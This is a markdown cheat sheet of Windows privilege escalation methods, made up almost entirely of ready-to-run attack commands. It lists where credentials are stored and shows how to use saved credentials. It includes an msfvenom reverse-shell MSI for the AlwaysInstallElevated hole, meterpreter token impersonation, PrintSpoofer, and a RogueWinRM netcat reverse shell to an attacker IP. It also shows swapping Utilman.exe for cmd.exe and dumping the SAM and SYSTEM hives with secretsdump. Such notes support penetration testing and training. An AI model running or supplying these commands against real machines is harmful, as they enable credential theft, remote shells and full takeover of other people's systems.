# Windows privilege escalation methods

## Find credentilas

### Places to find potential credentials
* `C:\Unattend.xml`
* `C:\Windows\Panther\Unattend.xml`
* `C:\Windows\Panther\Unattend\Unattend.xml`
* `C:\Windows\system32\sysprep.inf`
* `C:\Windows\system32\sysprep\sysprep.xml`
* `C:\Users\[user]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
* `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`

### View saved credentials
```bash
cmdkey /list
runas /savecred /user:[user] cmd.exe
```

### Retrieve credentials from PuTTY
```bash
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

## Quick wins

### Display scheduled tasks and informations about a specific one
```bash
schtasks
schtasks /query /tn [task] /fo list /v
```

### Malicious MSI installer
If both of these registery keys are set, the vulnerability is possible:

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

The exploit:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ip] LPORT=[port] -f msi -o malicious.msi
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

## Insecured services

### Display a service configuration
```bash
sc.exe qc [service]
```

Things to check for:
* Insecured permissions
* Unquoted service path

## Dangerous privileges

### Display current user privileges
```bash
whoami /priv
```

### SeDebugPrivilege / SeImpersonatePrivilege
In meterpreter:

```bash
load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators"
```

### SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege
```bash
PrintSpoofer64.exe -i -c cmd.exe
```

or

```bash
RogueWinRM.exe -p "nc.exe" -a "-e cmd.exe [ip] [port]"
```

### SeTakeOwnershipPrivilege
```bash
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant [user]:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
```

Then logout and click on the "Ease of Access" button.

### SeBackupPrivilege / SeRestorePrivilege
```bash
reg save hklm\system C:\Windows\Temp\system.hive
reg save hklm\sam C:\Windows\Temp\sam.hive
python3 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```

## Check for vulnerable softwares
```bash
wmic product get name,version,vendor
```
